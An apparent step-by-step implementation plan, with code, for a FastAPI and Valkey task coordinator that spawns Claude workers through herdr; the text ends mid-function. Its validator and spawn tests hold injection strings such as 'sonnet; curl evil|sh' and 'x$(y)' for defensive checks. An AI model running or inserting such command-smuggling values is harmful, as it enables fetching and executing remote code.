# Muster Tasks P1 (Coordinator) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship a single-host task coordinator: a FastAPI daemon that owns Valkey, accepts tasks, and runs each by spawning an interactive Claude worker via herdr, tracking it through a 5-state lifecycle.

**Architecture:** One FastAPI process per host owns a local Valkey. Agents (and a rewired thin MCP client) call it over HTTP + WebSocket with an `x-api-key`. A background claim loop moves `TODO` tasks to `WORKING`, spawns a `run-task` worker via herdr, and watches it to `DONE`/`TO_REVIEW`. All task-state writes go through one `asyncio.Lock` — no Lua, no distributed locks.

**Tech Stack:** Python 3.12+, FastAPI, uvicorn, `redis.asyncio` (Valkey), pytest + pytest-asyncio + httpx. Run everything with `uv run --with … --no-project` (no venv, matching the repo's existing pattern).

## Global Constraints

- **Single coordinator, single process.** All task-state mutations serialized by one module-level `asyncio.Lock`. No Lua scripting, no distributed locks, no HA, no multi-coordinator. (0.1.0)
- **Valkey:** `redis://localhost:6379/0`, key prefix `muster:`. Never hand-format a key — use `keys.py` helpers.
- **Workspace** selected via URL path `/workspace/{ws}/…`; auth header `x-api-key` (advisory / perimeter — validates the peer, carries no identity enforcement).
- **States are UPPERCASE:** `BACKLOG | TODO | WORKING | DONE | TO_REVIEW`. No `FAILED`/`TIMED_OUT`/`CANCELED`/`DEAD_LETTER`; all non-success → `TO_REVIEW` with a `review_reason` Tag. **No retry in P1.**
- **Security:** `pwd` must resolve under `MUSTER_WORKSPACE_FOLDER` (reject at create); `model` must match `^[A-Za-z0-9._-]+$`; all values interpolated into the spawn command are `shlex.quote`d. `promote` is CLI-only, never an HTTP endpoint.
- **Python:** type hints on public functions, docstrings on public APIs. Never `pip install` outside uv.
- **Test command (Valkey up):** `docker compose up -d` then
  `uv run --with fastapi --with uvicorn --with redis --with httpx --with pytest --with pytest-asyncio --no-project pytest plugins/muster/tests -v`

---

## File Structure

```
plugins/muster/coordinator/
  __init__.py
  config.py        # env config (URL, folder, default model, spawn cap, grace/timeout)
  keys.py          # Valkey key formatters (contract)
  tags.py          # Tag model + SYSTEM_TAGS registry
  models.py        # Task, TaskCreate, FileRef, ThreadEntry, Status enum, validators
  store.py         # async Valkey CRUD + the single state-transition function (the lock)
  spawn.py         # herdr driver: build launch cmd, spawn, pane_close, running_count
  loop.py          # claim loop + connected + liveness sweeps + boot recovery
  ws.py            # WebSocket delivery: stream replay from inboxread cursor
  app.py           # FastAPI app: /workspace/{ws} routes, x-api-key dep, task endpoints, WS
  cli.py           # `promote` command (BACKLOG→TODO), coordinator-host only
plugins/muster/skills/run-task/
  SKILL.md         # the worker protocol
plugins/muster/mcp/
  muster_channel.py  # MODIFY: relay reads a WS from the coordinator, not XREAD
  busops.py          # MODIFY: tool bodies proxy to the coordinator HTTP API
plugins/muster/tests/
  test_coord_keys.py test_coord_models.py test_coord_store.py test_coord_api.py
  test_coord_spawn.py test_coord_loop.py test_coord_ws.py test_coord_cli.py
```

---

### Task 1: Config, keys, tags, models

**Files:**
- Create: `plugins/muster/coordinator/__init__.py` (empty)
- Create: `plugins/muster/coordinator/config.py`
- Create: `plugins/muster/coordinator/keys.py`
- Create: `plugins/muster/coordinator/tags.py`
- Create: `plugins/muster/coordinator/models.py`
- Test: `plugins/muster/tests/test_coord_keys.py`, `test_coord_models.py`

**Interfaces:**
- Produces:
  - `config.Settings` with attrs `valkey_url:str`, `workspace_folder:str`, `default_model:str`, `spawn_cap:int`, `connect_grace_s:int=90`, `default_timeout_s:int=3600`; `config.settings` singleton via `Settings.from_env()`.
  - `keys.task(ws,id)`, `keys.tasks(ws)`, `keys.thread(ws,id)`, `keys.file(ws,fid)`, `keys.inbox(ws,name)`, `keys.inboxread(ws,name)`, `keys.presence(ws,name)` → `str`.
  - `tags.Tag(name:str, icon:str|None=None, color:str|None=None)`; `tags.SYSTEM_TAGS: dict[str,Tag]`; `tags.review(name:str)->Tag`.
  - `models.Status` (str enum: `BACKLOG,TODO,WORKING,DONE,TO_REVIEW`).
  - `models.TaskCreate` (validated input); `models.Task` (full record); `models.FileRef`; `models.ThreadEntry`.
  - `models.validate_model(m:str)->str` and `models.validate_pwd(pwd:str, folder:str)->str` (raise `ValueError`).

- [ ] **Step 1: Write failing tests for keys**

```python
# plugins/muster/tests/test_coord_keys.py
from plugins.muster.coordinator import keys

def test_key_shapes():
    assert keys.task("wsA", "id1") == "muster:task:wsA:id1"
    assert keys.tasks("wsA") == "muster:tasks:wsA"
    assert keys.thread("wsA", "id1") == "muster:task:wsA:id1:thread"
    assert keys.file("wsA", "f1") == "muster:file:wsA:f1"
    assert keys.inbox("wsA", "cy") == "muster:inbox:wsA:cy"
    assert keys.inboxread("wsA", "cy") == "muster:inboxread:wsA:cy"
    assert keys.presence("wsA", "cy") == "muster:presence:wsA:cy"
```

- [ ] **Step 2: Run, verify fail**

Run: `uv run --with redis --with pytest --no-project pytest plugins/muster/tests/test_coord_keys.py -v`
Expected: FAIL — `ModuleNotFoundError: coordinator`.

- [ ] **Step 3: Implement keys.py**

```python
# plugins/muster/coordinator/keys.py
"""Valkey key formatters — the schema contract. Never hand-format a key."""
def task(ws: str, id: str) -> str: return f"muster:task:{ws}:{id}"
def tasks(ws: str) -> str: return f"muster:tasks:{ws}"
def thread(ws: str, id: str) -> str: return f"muster:task:{ws}:{id}:thread"
def file(ws: str, fid: str) -> str: return f"muster:file:{ws}:{fid}"
def inbox(ws: str, name: str) -> str: return f"muster:inbox:{ws}:{name}"
def inboxread(ws: str, name: str) -> str: return f"muster:inboxread:{ws}:{name}"
def presence(ws: str, name: str) -> str: return f"muster:presence:{ws}:{name}"
```

- [ ] **Step 4: Implement config.py, tags.py**

```python
# plugins/muster/coordinator/config.py
import os
from dataclasses import dataclass

@dataclass
class Settings:
    valkey_url: str
    workspace_folder: str
    default_model: str
    spawn_cap: int
    connect_grace_s: int = 90
    default_timeout_s: int = 3600

    @classmethod
    def from_env(cls) -> "Settings":
        return cls(
            valkey_url=os.environ.get("MUSTER_VALKEY_URL", "redis://localhost:6379/0"),
            workspace_folder=os.path.realpath(os.environ.get("MUSTER_WORKSPACE_FOLDER", os.getcwd())),
            default_model=os.environ.get("MUSTER_DEFAULT_MODEL", "claude-sonnet-5"),
            spawn_cap=int(os.environ.get("MUSTER_SPAWN_CAP", "2")),
        )

settings = Settings.from_env()
```

```python
# plugins/muster/coordinator/tags.py
from dataclasses import dataclass

@dataclass
class Tag:
    name: str
    icon: str | None = None
    color: str | None = None

SYSTEM_TAGS: dict[str, Tag] = {
    "connecting":   Tag("connecting", "⏳", "gray"),
    "connected":    Tag("connected", "🔌", "blue"),
    "timeout":      Tag("timeout", "⏱", "orange"),
    "blocked":      Tag("blocked", "🔒", "amber"),
    "failed":       Tag("failed", "❌", "red"),
    "crashed":      Tag("crashed", "💥", "red"),
    "spawn_failed": Tag("spawn_failed", "💥", "red"),
    "canceled":     Tag("canceled", "🚫", "gray"),
}

def review(name: str) -> Tag:
    """Return the system Tag for a review reason, or a bare Tag if unknown."""
    return SYSTEM_TAGS.get(name, Tag(name))
```

- [ ] **Step 5: Write failing tests for models**

```python
# plugins/muster/tests/test_coord_models.py
import pytest
from plugins.muster.coordinator import models

def test_validate_model_ok():
    assert models.validate_model("claude-sonnet-5") == "claude-sonnet-5"

@pytest.mark.parametrize("bad", ["sonnet; curl x|sh", "a b", "x$(y)", "--add-dir"])
def test_validate_model_rejects_injection(bad):
    with pytest.raises(ValueError):
        models.validate_model(bad)

def test_validate_pwd_under_folder(tmp_path):
    (tmp_path / "repo").mkdir()
    assert models.validate_pwd(str(tmp_path / "repo"), str(tmp_path)).startswith(str(tmp_path))

def test_validate_pwd_escape_rejected(tmp_path):
    with pytest.raises(ValueError):
        models.validate_pwd("/etc", str(tmp_path))

def test_taskcreate_defaults_backlog_and_model():
    tc = models.TaskCreate(name="t", prompt="do x", pwd="/anything")
    assert tc.priority == "medium"
```

- [ ] **Step 6: Run, verify fail**

Run: `uv run --with redis --with pytest --no-project pytest plugins/muster/tests/test_coord_models.py -v`
Expected: FAIL — models missing.

- [ ] **Step 7: Implement models.py**

```python
# plugins/muster/coordinator/models.py
import os, re, uuid
from dataclasses import dataclass, field, asdict
from enum import StrEnum

_MODEL_RE = re.compile(r"^[A-Za-z0-9._-]+$")

class Status(StrEnum):
    BACKLOG = "BACKLOG"; TODO = "TODO"; WORKING = "WORKING"
    DONE = "DONE"; TO_REVIEW = "TO_REVIEW"

def validate_model(m: str) -> str:
    if not _MODEL_RE.match(m):
        raise ValueError(f"invalid model: {m!r}")
    return m

def validate_pwd(pwd: str, folder: str) -> str:
    real = os.path.realpath(pwd)
    root = os.path.realpath(folder)
    if real != root and not real.startswith(root + os.sep):
        raise ValueError(f"pwd {pwd!r} not under workspace folder {folder!r}")
    return real

@dataclass
class TaskCreate:
    name: str
    prompt: str
    pwd: str
    model: str | None = None
    description: str | None = None
    priority: str = "medium"
    reply_to: str | None = None
    timeout: int | None = None
    files_in: list[str] = field(default_factory=list)

@dataclass
class Task:
    id: str; workspace: str; name: str; prompt: str; pwd: str; model: str
    status: str = Status.BACKLOG
    description: str | None = None
    priority: str = "medium"
    created_by: str = "bot"
    enqueued_by: str = "unknown"
    reply_to: str | None = None
    review_reason: dict | None = None      # a Tag as dict
    capability: str = ""
    worker_pane: str = ""
    assigned_to: str = ""
    host: str = ""
    connected: bool = False
    claimed_at: str | None = None
    connected_at: str | None = None
    finished_at: str | None = None
    timeout: int = 3600
    output: str = ""
    files_in: list[str] = field(default_factory=list)
    files_out: list[str] = field(default_factory=list)
    created_at: str = ""
    updated_at: str = ""

    @staticmethod
    def new_id() -> str: return uuid.uuid4().hex

@dataclass
class FileRef:
    id: str; name: str; ext: str; type: str; size: int; created_by: str; path: str

@dataclass
class ThreadEntry:
    ts: str; from_: str; kind: str; body: str
```

- [ ] **Step 8: Run all Task 1 tests, verify pass**

Run: `uv run --with redis --with pytest --no-project pytest plugins/muster/tests/test_coord_keys.py plugins/muster/tests/test_coord_models.py -v`
Expected: PASS.

- [ ] **Step 9: Commit**

```bash
git add plugins/muster/coordinator/ plugins/muster/tests/test_coord_keys.py plugins/muster/tests/test_coord_models.py
git commit -m "feat(coordinator): config, keys, tags, models with pwd/model validation"
```

---

### Task 2: Task store — Valkey CRUD + the single transition function

**Files:**
- Create: `plugins/muster/coordinator/store.py`
- Test: `plugins/muster/tests/test_coord_store.py` (needs Valkey up)

**Interfaces:**
- Consumes: `keys`, `models.Task/TaskCreate/Status`, `tags.review`.
- Produces (all `async`, take a `redis.asyncio.Redis`):
  - `create(r, ws, tc:TaskCreate, *, created_by, enqueued_by, model, host)->Task` (status `BACKLOG`, ZADD-free: `SADD tasks(ws)` + `HSET task`).
  - `get(r, ws, id)->Task|None`; `list_by_status(r, ws, status:str|None)->list[Task]`.
  - `transition(r, ws, id, to:Status, *, allowed_from:set[Status], **fields)->Task` — the one guarded mutator; raises `Conflict` if current status ∉ allowed_from.
  - `set_connected(r, ws, id, worker_name, at)->Task|None`.
  - `append_thread(r, ws, id, entry:ThreadEntry)`.
  - `LOCK: asyncio.Lock` (module-level) and exception `Conflict`.

- [ ] **Step 1: Write failing tests**

```python
# plugins/muster/tests/test_coord_store.py
import pytest, redis.asyncio as aioredis
from plugins.muster.coordinator import store, models
from plugins.muster.coordinator.models import Status, TaskCreate

pytestmark = pytest.mark.asyncio

@pytest.fixture
async def r():
    c = aioredis.from_url("redis://localhost:6379/0", decode_responses=True)
    await c.flushdb(); yield c; await c.flushdb(); await c.aclose()

async def test_create_lands_backlog_and_roundtrips(r):
    t = await store.create(r, "ws", TaskCreate(name="n", prompt="p", pwd="/x"),
                           created_by="bot", enqueued_by="cy", model="m", host="h")
    got = await store.get(r, "ws", t.id)
    assert got.status == Status.BACKLOG and got.name == "n" and got.model == "m"

async def test_list_by_status(r):
    a = await store.create(r, "ws", TaskCreate(name="a", prompt="p", pwd="/x"),
                           created_by="bot", enqueued_by="cy", model="m", host="h")
    await store.transition(r, "ws", a.id, Status.TODO, allowed_from={Status.BACKLOG})
    todos = await store.list_by_status(r, "ws", Status.TODO)
    assert [t.id for t in todos] == [a.id]

async def test_transition_rejects_bad_source(r):
    a = await store.create(r, "ws", TaskCreate(name="a", prompt="p", pwd="/x"),
                           created_by="bot", enqueued_by="cy", model="m", host="h")
    # report DONE from BACKLOG must fail (only from WORKING)
    with pytest.raises(store.Conflict):
        await store.transition(r, "ws", a.id, Status.DONE, allowed_from={Status.WORKING})
```

- [ ] **Step 2: Run, verify fail**

Run: `docker compose up -d && uv run --with redis --with pytest --with pytest-asyncio --no-project pytest plugins/muster/tests/test_coord_store.py -v`
Expected: FAIL — store missing.

- [ ] **Step 3: Implement store.py**

```python
# plugins/muster/coordinator/store.py
import asyncio, json
from datetime import datetime, timezone
from dataclasses import asdict
from . import keys
from .models import Task, TaskCreate, Status, ThreadEntry

LOCK = asyncio.Lock()

class Conflict(Exception): ...

def _now() -> str: return datetime.now(timezone.utc).isoformat()

def _dump(t: Task) -> dict:
    d = asdict(t)
    for k, v in list(d.items()):
        if isinstance(v, (list, dict)): d[k] = json.dumps(v)
        elif isinstance(v, bool): d[k] = "1" if v else "0"
        elif v is None: d[k] = ""
    return d

_LIST = {"files_in", "files_out"}; _JSON = {"review_reason"}; _BOOL = {"connected"}

def _load(h: dict) -> Task:
    d = dict(h)
    for k in _LIST: d[k] = json.loads(d[k]) if d.get(k) else []
    for k in _JSON: d[k] = json.loads(d[k]) if d.get(k) else None
    for k in _BOOL: d[k] = d.get(k) == "1"
    d["timeout"] = int(d.get("timeout") or 3600)
    d = {k: v for k, v in d.items() if k in Task.__dataclass_fields__}
    return Task(**d)

async def create(r, ws, tc: TaskCreate, *, created_by, enqueued_by, model, host) -> Task:
    tid = Task.new_id(); now = _now()
    t = Task(id=tid, workspace=ws, name=tc.name, prompt=tc.prompt, pwd=tc.pwd,
             model=model, description=tc.description, priority=tc.priority,
             created_by=created_by, enqueued_by=enqueued_by, reply_to=tc.reply_to or enqueued_by,
             timeout=tc.timeout or 3600, files_in=tc.files_in, host=host,
             created_at=now, updated_at=now)
    async with LOCK:
        await r.hset(keys.task(ws, tid), mapping=_dump(t))
        await r.sadd(keys.tasks(ws), tid)
    return t

async def get(r, ws, id) -> Task | None:
    h = await r.hgetall(keys.task(ws, id))
    return _load(h) if h else None

async def list_by_status(r, ws, status: str | None) -> list[Task]:
    ids = await r.smembers(keys.tasks(ws))
    out = []
    for i in ids:
        h = await r.hgetall(keys.task(ws, i))
        if h and (status is None or h.get("status") == status):
            out.append(_load(h))
    return out

async def transition(r, ws, id, to: Status, *, allowed_from: set, **fields) -> Task:
    async with LOCK:
        h = await r.hgetall(keys.task(ws, id))
        if not h: raise Conflict(f"no task {id}")
        cur = h.get("status")
        if cur not in {s.value for s in allowed_from}:
            raise Conflict(f"{id}: {cur} !-> {to} (need {allowed_from})")
        patch = {"status": to.value, "updated_at": _now()}
        for k, v in fields.items():
            patch[k] = json.dumps(v) if isinstance(v, (list, dict)) else ("1" if v is True else "0" if v is False else "" if v is None else v)
        await r.hset(keys.task(ws, id), mapping=patch)
        return _load({**h, **patch})

async def set_connected(r, ws, id, worker_name, at) -> Task | None:
    async with LOCK:
        h = await r.hgetall(keys.task(ws, id))
        if not h or h.get("status") != Status.WORKING or h.get("connected") == "1":
            return None
        patch = {"connected": "1", "assigned_to": worker_name, "connected_at": at, "updated_at": _now()}
        await r.hset(keys.task(ws, id), mapping=patch)
        return _load({**h, **patch})

async def append_thread(r, ws, id, entry: ThreadEntry):
    await r.rpush(keys.thread(ws, id), json.dumps({"ts": entry.ts, "from": entry.from_,
                                                   "kind": entry.kind, "body": entry.body}))
```

- [ ] **Step 4: Run, verify pass**

Run: `uv run --with redis --with pytest --with pytest-asyncio --no-project pytest plugins/muster/tests/test_coord_store.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add plugins/muster/coordinator/store.py plugins/muster/tests/test_coord_store.py
git commit -m "feat(coordinator): Valkey task store with single guarded transition()"
```

---

### Task 3: FastAPI app + task endpoints

**Files:**
- Create: `plugins/muster/coordinator/app.py`
- Test: `plugins/muster/tests/test_coord_api.py`

**Interfaces:**
- Consumes: `store`, `models`, `config.settings`, `tags.review`.
- Produces: `app.build_app(r)->FastAPI` with routes under `/workspace/{ws}`:
  `POST /tasks`, `GET /tasks/{id}`, `GET /tasks`, `POST /tasks/{id}/report`, `POST /tasks/{id}/note`, `POST /tasks/{id}/cancel`. Header `x-api-key` required (any non-empty value in P1). `report` allowed only from `WORKING` else 409; create validates `pwd`/`model` else 422.

- [ ] **Step 1: Write failing tests**

```python
# plugins/muster/tests/test_coord_api.py
import pytest, redis.asyncio as aioredis
from httpx import AsyncClient, ASGITransport
from plugins.muster.coordinator import app as appmod
from plugins.muster.coordinator import config

pytestmark = pytest.mark.asyncio
H = {"x-api-key": "k"}

@pytest.fixture
async def client(tmp_path, monkeypatch):
    monkeypatch.setattr(config.settings, "workspace_folder", str(tmp_path))
    (tmp_path / "repo").mkdir()
    r = aioredis.from_url("redis://localhost:6379/0", decode_responses=True)
    await r.flushdb()
    a = appmod.build_app(r)
    async with AsyncClient(transport=ASGITransport(app=a), base_url="http://t") as c:
        yield c, r, str(tmp_path / "repo")
    await r.flushdb(); await r.aclose()

async def test_create_lands_backlog(client):
    c, r, pwd = client
    resp = await c.post("/workspace/ws/tasks", headers=H, json={"name": "n", "prompt": "p", "pwd": pwd})
    assert resp.status_code == 200 and resp.json()["status"] == "BACKLOG"

async def test_create_rejects_pwd_outside_folder(client):
    c, r, pwd = client
    resp = await c.post("/workspace/ws/tasks", headers=H, json={"name": "n", "prompt": "p", "pwd": "/etc"})
    assert resp.status_code == 422

async def test_report_on_backlog_conflicts(client):
    c, r, pwd = client
    tid = (await c.post("/workspace/ws/tasks", headers=H, json={"name": "n", "prompt": "p", "pwd": pwd})).json()["id"]
    resp = await c.post(f"/workspace/ws/tasks/{tid}/report", headers=H, json={"state": "DONE", "output": "x"})
    assert resp.status_code == 409

async def test_missing_key_rejected(client):
    c, r, pwd = client
    resp = await c.post("/workspace/ws/tasks", json={"name": "n", "prompt": "p", "pwd": pwd})
    assert resp.status_code == 401
```

- [ ] **Step 2: Run, verify fail**

Run: `uv run --with fastapi --with httpx --with redis --with pytest --with pytest-asyncio --no-project pytest plugins/muster/tests/test_coord_api.py -v`
Expected: FAIL — app missing.

- [ ] **Step 3: Implement app.py**

```python
# plugins/muster/coordinator/app.py
import socket
from fastapi import FastAPI, Header, HTTPException, Body
from . import store, models
from .config import settings
from .tags import review
from .models import Status, TaskCreate

def build_app(r) -> FastAPI:
    app = FastAPI()

    def auth(x_api_key: str | None):
        if not x_api_key:
            raise HTTPException(401, "missing x-api-key")

    @app.post("/workspace/{ws}/tasks")
    async def create(ws: str, body: dict = Body(...), x_api_key: str | None = Header(None)):
        auth(x_api_key)
        try:
            model = models.validate_model(body.get("model") or settings.default_model)
            pwd = models.validate_pwd(body["pwd"], settings.workspace_folder)
        except (ValueError, KeyError) as e:
            raise HTTPException(422, str(e))
        tc = TaskCreate(name=body["name"], prompt=body["prompt"], pwd=pwd,
                        model=model, description=body.get("description"),
                        priority=body.get("priority", "medium"), reply_to=body.get("reply_to"),
                        timeout=body.get("timeout"), files_in=body.get("files_in", []))
        created_by = "human" if body.get("created_by") == "human" else "bot"
        t = await store.create(r, ws, tc, created_by=created_by, enqueued_by=x_api_key,
                               model=model, host=socket.gethostname())
        return t

    @app.get("/workspace/{ws}/tasks/{id}")
    async def get(ws: str, id: str, x_api_key: str | None = Header(None)):
        auth(x_api_key)
        t = await store.get(r, ws, id)
        if not t: raise HTTPException(404, "no task")
        return t

    @app.get("/workspace/{ws}/tasks")
    async def listing(ws: str, status: str | None = None, x_api_key: str | None = Header(None)):
        auth(x_api_key)
        return await store.list_by_status(r, ws, status)

    @app.post("/workspace/{ws}/tasks/{id}/report")
    async def report(ws: str, id: str, body: dict = Body(...), x_api_key: str | None = Header(None)):
        auth(x_api_key)
        state = body.get("state")
        if state not in (Status.DONE, Status.TO_REVIEW):
            raise HTTPException(400, "state must be DONE or TO_REVIEW")
        fields = {"output": body.get("output", ""), "finished_at": store._now()}
        if state == Status.TO_REVIEW:
            fields["review_reason"] = review(body.get("reason", "failed")).__dict__
        try:
            t = await store.transition(r, ws, id, Status(state),
                                       allowed_from={Status.WORKING}, **fields)
        except store.Conflict as e:
            raise HTTPException(409, str(e))
        return t

    @app.post("/workspace/{ws}/tasks/{id}/note")
    async def note(ws: str, id: str, body: dict = Body(...), x_api_key: str | None = Header(None)):
        auth(x_api_key)
        kind = body.get("kind", "comment")
        if kind in ("nudge", "system"):
            raise HTTPException(400, "reserved kind")
        await store.append_thread(r, ws, id, models.ThreadEntry(
            ts=store._now(), from_=x_api_key or "?", kind=kind, body=body.get("body", "")))
        return {"ok": True}

    @app.post("/workspace/{ws}/tasks/{id}/cancel")
    async def cancel(ws: str, id: str, x_api_key: str | None = Header(None)):
        auth(x_api_key)
        t = await store.get(r, ws, id)
        if not t: raise HTTPException(404, "no task")
        if t.status in (Status.BACKLOG, Status.TODO):
            async with store.LOCK:
                await r.srem(store.keys.tasks(ws), id)
                await r.delete(store.keys.task(ws, id))
            return {"removed": True}
        if t.status == Status.WORKING:
            from . import spawn
            spawn.pane_close(t.worker_pane)
            t = await store.transition(r, ws, id, Status.TO_REVIEW, allowed_from={Status.WORKING},
                                       review_reason=review("canceled").__dict__,
                                       output=f"canceled; tree may be dirty at {t.pwd}")
            return t
        raise HTTPException(409, f"cannot cancel {t.status}")

    return app
```

- [ ] **Step 4: Run, verify pass** (spawn import is lazy; `pane_close` only hit on WORKING cancel — not in these tests)

Run: `uv run --with fastapi --with httpx --with redis --with pytest --with pytest-asyncio --no-project pytest plugins/muster/tests/test_coord_api.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add plugins/muster/coordinator/app.py plugins/muster/tests/test_coord_api.py
git commit -m "feat(coordinator): FastAPI task endpoints (create/get/list/report/note/cancel)"
```

---

### Task 4: Spawn — herdr driver + command building

**Files:**
- Create: `plugins/muster/coordinator/spawn.py`
- Test: `plugins/muster/tests/test_coord_spawn.py`

**Interfaces:**
- Consumes: `models.validate_model`.
- Produces:
  - `spawn.build_cmd(pwd, ws, model, task_id)->str` (shlex-quoted, validated model).
  - `spawn.spawn(pwd, ws, model, task_id)->str` (returns herdr pane id; shells `herdr pane split`+`pane run`).
  - `spawn.pane_close(pane_id)->None`.
  - `spawn.running_count(host)->int` (herdr pane list, count agent panes we own — P1: count WORKING tasks instead; see note).

Note: `running_count` in P1 is computed by the loop from WORKING tasks, not herdr — so `spawn` only needs `build_cmd`/`spawn`/`pane_close`. Keep `spawn` free of store deps.

- [ ] **Step 1: Write failing test (pure command building — the security-critical part)**

```python
# plugins/muster/tests/test_coord_spawn.py
import pytest
from plugins.muster.coordinator import spawn

def test_build_cmd_shape():
    cmd = spawn.build_cmd("/repo/x", "wsA", "claude-sonnet-5", "id1")
    assert "cd /repo/x" in cmd
    assert "MUSTER_WORKSPACE=wsA" in cmd
    assert "--model claude-sonnet-5" in cmd
    assert "Load skill muster:run-task. Your taskID is id1." in cmd

def test_build_cmd_rejects_bad_model():
    with pytest.raises(ValueError):
        spawn.build_cmd("/repo/x", "wsA", "sonnet; curl evil|sh", "id1")

def test_build_cmd_quotes_pwd_with_space():
    cmd = spawn.build_cmd("/re po/x", "wsA", "m", "id1")
    assert "'/re po/x'" in cmd
```

- [ ] **Step 2: Run, verify fail**

Run: `uv run --with pytest --no-project pytest plugins/muster/tests/test_coord_spawn.py -v`
Expected: FAIL — spawn missing.

- [ ] **Step 3: Implement spawn.py**

```python
# plugins/muster/coordinator/spawn.py
import json, shlex, subprocess
from .models import validate_model

def build_cmd(pwd: str, ws: str, model: str, task_id: str) -> str:
    """Build the herdr pane-run shell line. Model validated; every value quoted."""
    validate_model(model)
    prompt = f"Load skill muster:run-task. Your taskID is {task_id}."
    return (f"cd {shlex.quote(pwd)} && MUSTER_WORKSPACE={shlex.quote(ws)} "
            f"cy --model {shlex.quote(model)} {shlex.quote(prompt)}")

def _herdr(*args: str) -> str:
    return subprocess.run(["herdr", *args], capture_output=True, text=True, timeout=15).stdout

def spawn(pwd: str, ws: str, model: str, task_id: str, *, workspace_id: str) -> str:
    """Split a new pane in the herdr workspace and run the worker. Returns the pane id."""
    out = _herdr("tab", "create", "--workspace", workspace_id, "--label", f"task-{task_id[:6]}", "--no-focus")
    pane = json.loads(out)["result"]["root_pane"]["pane_id"]
    _herdr("pane", "run", pane, build_cmd(pwd, ws, model, task_id))
    return pane

def pane_close(pane_id: str) -> None:
    if pane_id:
        try: _herdr("pane", "close", pane_id)
        except Exception: pass
```

- [ ] **Step 4: Run, verify pass**

Run: `uv run --with pytest --no-project pytest plugins/muster/tests/test_coord_spawn.py -v`
Expected: PASS (spawn/pane_close not exercised — they shell out to herdr).

- [ ] **Step 5: Commit**

```bash
git add plugins/muster/coordinator/spawn.py plugins/muster/tests/test_coord_spawn.py
git commit -m "feat(coordinator): herdr spawn driver with injection-safe command building"
```

---

### Task 5: Claim loop + connected + liveness sweeps + boot recovery

**Files:**
- Create: `plugins/muster/coordinator/loop.py`
- Test: `plugins/muster/tests/test_coord_loop.py`

**Interfaces:**
- Consumes: `store`, `spawn`, `config.settings`, `models.Status`, `tags.review`.
- Produces:
  - `loop.pick(todos:list[Task])->Task|None` (priority then age).
  - `loop.claim_once(r, ws, *, spawner, host, workspace_id)->Task|None` (one claim+spawn if under cap).
  - `loop.sweep(r, ws, *, now_iso)->None` (connect-grace, work-timeout, pane-gone → TO_REVIEW).
  - `loop.recover(r, ws, *, pane_alive)->None` (boot reconciliation).
  - `loop.PRIORITY: dict[str,int]`.

- [ ] **Step 1: Write failing tests (inject a fake spawner + fixed clock)**

```python
# plugins/muster/tests/test_coord_loop.py
import pytest, redis.asyncio as aioredis
from plugins.muster.coordinator import store, loop
from plugins.muster.coordinator.models import Status, TaskCreate

pytestmark = pytest.mark.asyncio

@pytest.fixture
async def r():
    c = aioredis.from_url("redis://localhost:6379/0", decode_responses=True)
    await c.flushdb(); yield c; await c.flushdb(); await c.aclose()

async def _mk(r, name, prio, status):
    t = await store.create(r, "ws", TaskCreate(name=name, prompt="p", pwd="/x", priority=prio),
                           created_by="bot", enqueued_by="cy", model="m", host="h")
    if status != Status.BACKLOG:
        await store.transition(r, "ws", t.id, status, allowed_from={Status.BACKLOG})
    return t

def test_pick_highest_priority(r):
    from plugins.muster.coordinator.models import Task
    a = Task(id="a", workspace="ws", name="a", prompt="", pwd="", model="m", priority="low", created_at="2020")
    b = Task(id="b", workspace="ws", name="b", prompt="", pwd="", model="m", priority="high", created_at="2021")
    assert loop.pick([a, b]).id == "b"

async def test_claim_sets_working_and_spawns(r):
    await _mk(r, "a", "medium", Status.TODO)
    calls = []
    def spawner(t): calls.append(t.id); return "pane-1"
    claimed = await loop.claim_once(r, "ws", spawner=spawner, host="h", workspace_id="wN")
    assert claimed.status == Status.WORKING and claimed.worker_pane == "pane-1" and calls

async def test_connect_grace_expiry_spawn_failed(r):
    t = await _mk(r, "a", "medium", Status.TODO)
    await store.transition(r, "ws", t.id, Status.WORKING, allowed_from={Status.TODO},
                           worker_pane="p", claimed_at="2000-01-01T00:00:00+00:00")
    await loop.sweep(r, "ws", now_iso="2999-01-01T00:00:00+00:00", pane_alive=lambda p: True)
    got = await store.get(r, "ws", t.id)
    assert got.status == Status.TO_REVIEW and got.review_reason["name"] == "spawn_failed"
```

- [ ] **Step 2: Run, verify fail**

Run: `uv run --with redis --with pytest --with pytest-asyncio --no-project pytest plugins/muster/tests/test_coord_loop.py -v`
Expected: FAIL — loop missing.

- [ ] **Step 3: Implement loop.py**

```python
# plugins/muster/coordinator/loop.py
from datetime import datetime, timezone
from . import store
from .config import settings
from .models import Status, Task
from .tags import review

PRIORITY = {"critical": 3, "high": 2, "medium": 1, "low": 0}

def _age_key(t: Task): return t.created_at or ""

def pick(todos: list[Task]) -> Task | None:
    if not todos: return None
    return max(todos, key=lambda t: (PRIORITY.get(t.priority, 1), _age_key(t) == "", ) )  # priority, then oldest first
    # note: oldest-first = smallest created_at; refine below

def pick(todos: list[Task]) -> Task | None:  # noqa: F811  (final version)
    if not todos: return None
    return sorted(todos, key=lambda t: (-PRIORITY.get(t.priority, 1), t.created_at))[0]

async def claim_once(r, ws, *, spawner, host, workspace_id) -> Task | None:
    working = await store.list_by_status(r, ws, Status.WORKING)
    if len(working) >= settings.spawn_cap:
        return None
    todos = await store.list_by_status(r, ws, Status.TODO)
    t = pick(todos)
    if not t:
        return None
    now = store._now()
    claimed = await store.transition(r, ws, t.id, Status.WORKING, allowed_from={Status.TODO},
                                     claimed_at=now, connected=False)
    pane = spawner(claimed)
    return await store.transition(r, ws, t.id, Status.WORKING, allowed_from={Status.WORKING},
                                  worker_pane=pane, capability=f"host:{host}:pwd:{t.pwd}:model:{t.model}")

def _secs_between(a_iso: str, b_iso: str) -> float:
    return (datetime.fromisoformat(b_iso) - datetime.fromisoformat(a_iso)).total_seconds()

async def _to_review(r, ws, id, reason):
    try:
        await store.transition(r, ws, id, Status.TO_REVIEW, allowed_from={Status.WORKING},
                               review_reason=review(reason).__dict__)
    except store.Conflict:
        pass  # already terminal (worker reported first) — first-writer-wins

async def sweep(r, ws, *, now_iso, pane_alive):
    for t in await store.list_by_status(r, ws, Status.WORKING):
        if not t.connected:
            if t.claimed_at and _secs_between(t.claimed_at, now_iso) > settings.connect_grace_s:
